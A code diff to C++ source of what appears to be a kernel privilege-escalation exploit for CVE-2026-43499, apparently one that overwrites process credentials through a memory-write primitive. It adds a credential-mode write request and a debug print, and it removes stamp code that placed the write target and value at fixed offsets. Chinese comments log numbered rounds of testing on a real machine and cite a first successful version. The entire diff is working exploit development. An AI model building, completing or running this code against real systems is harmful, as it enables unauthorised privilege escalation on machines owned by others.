@@ -141,6 +141,9 @@ namespace ghostlock::backend::cve_2026_43499::landing {
         std::int32_t requeue_result = 0;
         std::int32_t waiter_result = 0;
         std::int32_t owner_result = 0;
+        /** The write shape carried into this attempt; diagnostic, not a decision input here. */
+        std::int32_t write_mode = 0;
+        bool preserve_child = false;
     };
 
     /** What the three actors share. Reset per attempt; the plain members are written before the
@@ -252,8 +255,20 @@ namespace ghostlock::backend::cve_2026_43499::landing {
          *  waiters are joined before this returns. */
         [[nodiscard]] bool execute(std::uint64_t address, std::uint64_t value,
                                    std::uint64_t offset) noexcept {
+            memory::WriteRequest request{};
+            request.target = address;
+            request.mode = memory::WriteMode::Credential;
+            request.preserve_child = false;
+            return execute(request, value, offset);
+        }
+
+        /** One attempt carrying the write shape; the target is the request's target. */
+        [[nodiscard]] bool execute(const memory::WriteRequest &request, std::uint64_t value,
+                                   std::uint64_t offset) noexcept {
             static_cast<void>(offset);
             report_ = MulticastRouteReport{};
+            report_.write_mode = static_cast<std::int32_t>(request.mode);
+            report_.preserve_child = request.preserve_child;
             if (config_.limits.max_attempts <= 0 || config_.limits.arm_hold <= 0 ||
                 config_.limits.arm_sequence <= 0 || config_.stamp.buffer_size == 0U ||
                 config_.stamp.buffer_size > sizeof(stamp_) || config_.nice_modulus <= 0 ||
@@ -266,11 +281,11 @@ namespace ghostlock::backend::cve_2026_43499::landing {
              *  one. */
             /* 诊断（round 232 ✓）：打印 guard 的两半，定位是哪一项不等 ✓（验证后同批清理 ✓）。 */
             std::printf("main: route-guard address=0x%llx target=0x%llx value=0x%llx cfg=0x%llx",
-                        static_cast<unsigned long long>(address),
+                        static_cast<unsigned long long>(request.target),
                         static_cast<unsigned long long>(config_.target),
                         static_cast<unsigned long long>(value),
                         static_cast<unsigned long long>(config_.value));
-            if (address != config_.target || value != config_.value) {
+            if (request.target != config_.target || value != config_.value) {
             report_.status = refusal(route::RouteResultCode::Unsupported, 59);
                 return false;
             }
@@ -345,20 +360,7 @@ namespace ghostlock::backend::cve_2026_43499::landing {
              *  `{mode=Zero, leaf=1}` ⇒ **`pc = target − 8`** ✓、**`left = 0`** ✓；
              *  而 `right = preserve ? (Credential ? init_cred_alias : page_base+0x100) : 0` ✓（`payload_write_layout` ✓）。
              *  ⇒ ⇒ 原先写 `{pc = value, right = 0, left = target}` ✗ ⇒ **三字全错** ⇒ 改成权威值 ✓。 */
-            if (config_.value != 0U) {
-                /* ★★ 第 198 轮**回退** ✗：第 196 轮按权威向量改成 `{target−8, value, 0}` ⇒ 真机**停住** ✗
-                 *  ⇒ 说明"三字 = 页内的字"这一层在本树并不成立 ⇒ 先复原 ✓。 */
-                /* ★★ 第 210 轮**回退** ✗：第 209 轮的教训 —— 真机 `page-after-build` 的 `pc`/`left`
-                 *  **没随本处改动而变** ✓ ⇒ ⇒ **⇒ 本树的三字在**页构造**（`build_payload_page` ✓），
-                 *  不在 stamp ✗ ⇒ 故本处先复原 ✓，改法落到页那一层 ✓。 */
-                /* ★★ 第 236 轮 ✓（旧 C `641aaf6` 的 `mr_stamp` 逐字 ✓，**首次成功那一版** ✓）：
-                 *  `put64(b, **o**, (**target − 8**) & ~3)` ✓ ；`put64(b, **o + 8**, **value**)` ✓
-                 *  ⇒ 即：目标与值放在 **`waiter_offset + 0x00 / 0x08`** ✓（本树原先放 `0x18/0x20/0x28` ✗）。 */
-                const std::uint64_t stamped_target =
-                        (static_cast<std::uint64_t>(config_.target) - 8U) & ~static_cast<std::uint64_t>(3U);
-                put_tuple(0x00U, stamped_target);
-                put_tuple(0x08U, config_.value);
-            }
+            /* Stamp carries only task/lock (reference shape); the write vector belongs to the page. */
             return true;
         }
 
